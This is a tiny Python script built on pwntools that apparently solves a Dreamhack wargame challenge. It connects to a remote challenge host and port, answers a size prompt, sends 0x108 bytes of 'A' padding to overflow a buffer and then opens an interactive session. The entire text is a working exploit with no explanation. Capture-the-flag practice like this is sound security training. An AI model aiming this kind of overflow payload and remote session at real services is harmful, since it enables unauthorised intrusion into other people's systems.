from pwn import *

port = 14182
rem = remote("host8.dreamhack.games", port)

rem.sendlineafter(b"size: ", b"280")
rem.sendline(b"A" * 0x108)

rem.interactive()